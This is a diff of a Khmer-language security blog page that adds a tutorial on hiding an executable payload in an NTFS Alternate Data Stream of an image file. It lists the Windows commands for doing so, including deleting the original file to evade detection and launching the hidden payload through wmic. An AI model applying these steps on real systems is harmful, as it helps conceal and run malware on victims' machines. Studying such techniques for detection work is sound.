@@ -1757,7 +1757,39 @@
     </div>
     <article class="single__contents" data-dir="ltr" data-ani="true">
       
-      <p>ជាគោលគំនិតក្នុងការលាក់ Payload ក្នុង ADS ដោយប្រើប្រាស់ <a href="https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil">Certutil</a> ។</p>
+      <p>ខាងក្រោមជាវិធីសាស្ត្រក្នុងការលាក់ ផេឡូតនៅក្នុងឯកសារផ្សេងៗ។ ចំពោះកាបង្ហាញខាងក្រោមខ្ញុំនឹងសាកល្បងលាក់នៅក្នុងឯកសាររូបភាព (jpg, png, gif, etc.) ។</p>
+<h3 id="hide-payload-inside-image-file">Hide Payload Inside Image File</h3>
+<p>នៅក្នុងវីនដូសូមវាយពាក្យបញ្ជាដូចខាងក្រោម៖</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl"><span class="k">type</span> payload.exe <span class="p">&gt;</span> imagefile.png:payload.exe</span></span></code></pre></td></tr></table>
+</div>
+</div>
+<p>ក្រោយពីលាក់រួចយើងអាចពិនិត្យមើល ADS បានដោយប្រើពាក្យបញ្ជា <span style="color:grey;">dir /r</span> ។</p>
+<p>សូមធ្វើការលុបឯកសាមេរោគដើមចេញ ជៀសវៀងពីការរកឃើញ៖</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl"><span class="k">del</span> payload.exe</span></span></code></pre></td></tr></table>
+</div>
+</div>
+<p>ដើម្បីដំណើរការ payload យើងអាចប្រើពាក្យបញ្ជាដូចខាងក្រោម៖</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">wmic.exe process call create <span class="s2">&#34;C:\ProgramData\imagefile.png:payload.exe&#34;</span></span></span></code></pre></td></tr></table>
+</div>
+</div>
+<p>រួចរាល់ ។</p>
+<h3 id="hide-payload-through-certutil">Hide Payload Through Certutil</h3>
+<p>ជាគោលគំនិតក្នុងការលាក់ Payload ក្នុង ADS ដោយប្រើប្រាស់ <a href="https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil">Certutil</a> ។</p>
 <h4 id="generate-ads">Generate ADS</h4>
 <p>ខាងក្រោមជាដំណើរការក្នុងការលាក់ Payload Strings នៅក្នុង ADS ដោយប្រើប្រាស់ពាក្យបញ្ជាដែលមានស្រាប់ក្នុង Powershell ។</p>
 <p>បើកផ្ទាំង CMD រួចវាយពាក្យបញ្ជាខាងក្រោម៖</p>
@@ -2531,7 +2563,8 @@ document.addEventListener('DOMContentLoaded', function () {
   <ul>
     <li>
       <ul>
-        <li>
+        <li><a href="#hide-payload-inside-image-file">Hide Payload Inside Image File</a></li>
+        <li><a href="#hide-payload-through-certutil">Hide Payload Through Certutil</a>
           <ul>
             <li><a href="#generate-ads">Generate ADS</a></li>
             <li><a href="#certutil">Certutil</a></li>
